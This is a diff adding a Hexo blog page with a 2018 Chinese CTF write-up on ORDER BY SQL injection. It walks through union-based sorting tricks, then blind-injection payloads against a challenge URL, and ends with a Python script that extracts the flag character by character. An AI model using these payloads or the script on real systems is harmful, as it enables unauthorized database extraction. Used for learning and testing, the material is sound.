@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+<title>浅析Order by 注入 | Love to share</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bentham&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bentham&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div id="post-toc" class="post-toc">
+            <span class="post-toc-title">catalogue</span>
+            <div class="post-toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#小实验"><span class="toc-text">小实验</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#另一种Order-by"><span class="toc-text">另一种Order by</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#安恒周周练的sql注入"><span class="toc-text">安恒周周练的sql注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考博客"><span class="toc-text">参考博客</span></a></li></ol></li></ol>
+            </div>
+        </div>
+    
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">浅析Order by 注入</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">zhhhy</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">September 20, 2018&nbsp;&nbsp;20:49:55</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <section class="post-content">
+            <p>做了一道安恒X计划平台上的一道注入题,是关于order注入的,直接用sqlmap就可以拿到flag<br>orderby注入的题目并没仔细研究过,于是写下这篇文章,简单分析一下.</p>
+<a id="more"></a>
+
+<h2 id="小实验"><a href="#小实验" class="headerlink" title="小实验"></a>小实验</h2><p>创建如下数据库</p>
+<p><img src="ORDERBY/orderby1.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">构造查询语句 </span><br><span class="line">select * from user where username=&apos;&apos; or 1 union select 10086,2,&apos;b&apos; order by 3</span><br></pre></td></tr></table></figure>
+
+<p><img src="ORDERBY/oderby2.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">再次构造查询语句</span><br><span class="line">select * from user where username=&apos;&apos; or 1 union select 10086,2,&apos;a&apos; order by 3</span><br></pre></td></tr></table></figure>
+
+<p><img src="ORDERBY/oderby3.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">进一步构造查询语句</span><br><span class="line">select * from user where username=&apos;&apos; or 1 union select 10086,2,&apos;ad&apos; order by 3;</span><br></pre></td></tr></table></figure>
+
+<p><img src="ORDERBY/orderby4.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">继续构造查询语句</span><br><span class="line">select * from user where username=&apos;&apos; or 1 union select 10086,2,&apos;an&apos; order by 3;</span><br></pre></td></tr></table></figure>
+
+<p><img src="ORDERBY/oderby5.png" alt></p>
+<p>不难发现的确可以通过这种方式注入出数据,这种注入方式运用的并不多.观察这些payload这样的注入方式并没有使用括号,在括号被过滤的情况下可以使用这个完成注入.不过这个方法还是很鸡肋,前提是知道需要爆的数据在第几列,然后进行盲注</p>
+<h2 id="另一种Order-by"><a href="#另一种Order-by" class="headerlink" title="另一种Order by"></a>另一种Order by</h2><h3 id="安恒周周练的sql注入"><a href="#安恒周周练的sql注入" class="headerlink" title="安恒周周练的sql注入"></a>安恒周周练的sql注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10001/?order=id%20desc&amp;button=submit</span><br></pre></td></tr></table></figure>
+
+<p><img src="ORDERBY/11.png" alt></p>
+<p><img src="E:ORDERBY%5C222.png" alt></p>
+<p>发现返回值变为倒序.说明我们构造的sql语句成功执行了,该点存在sql注入,由于没有回显,只能进行盲注.payload原理其实还没有搞懂.留坑以后填.</p>
+<p>爆表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select+1+regexp+if(ord(substring((select table_name from information_schema.tables where table_schema=database() limit 0 ,1),1,1))&gt;34,1,0x00))%23</span><br></pre></td></tr></table></figure>
+
+<p>爆列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10001/?order=(select+1+regexp+if(ord(substring((select%20flag%20from%20flag%20limit%200%20,1),1,1))%3E34,1,0x00))%23&amp;button=submit&amp;button=submit</span><br></pre></td></tr></table></figure>
+
+<p>爆值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select+1+regexp+if(ord(substring((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200%20,1),1,1))%3E34,1,0x00))%23</span><br></pre></td></tr></table></figure>
+
+<p>参考脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">url = <span class="string">'http://101.71.29.5:10001/?order=(select+1+regexp+if(ord(substring((select+flag+from+flag+limit+0,1),&#123;&#125;,1))=&#123;&#125;,1,0x00))%23&amp;button=submit'</span>                                                                                                                                       </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>,<span class="number">28</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">		u = url.format(i,j)</span><br><span class="line">		print(u)</span><br><span class="line">		<span class="keyword">if</span> (<span class="string">'fangzhang'</span> <span class="keyword">not</span> <span class="keyword">in</span> requests.get(u).text):</span><br><span class="line">			flag += chr(j)</span><br><span class="line">			print(flag)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<h3 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h3><p><a href="https://www.cnblogs.com/REscan/p/6884278.html" target="_blank" rel="noopener">https://www.cnblogs.com/REscan/p/6884278.html</a></p>
+
+        </section>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>zhhhy</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://yoursite.com/2018/09/20/ORDERBY/">http://yoursite.com/2018/09/20/ORDERBY/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Solgan:</span>
+                         <span>Do you believe in <strong>DESTINY<strong>?</strong></strong></span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2018/09/21/LDAP/">初见LDAP注入</a>
+            
+            
+            <a class="next" rel="next" href="/2018/09/05/反序列化/">反序列化</a>
+            
+        </section>
+
+
+    </article>
+</div>
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© zhhhy | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Sirice19/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+    </div>
+</body>
+</html>
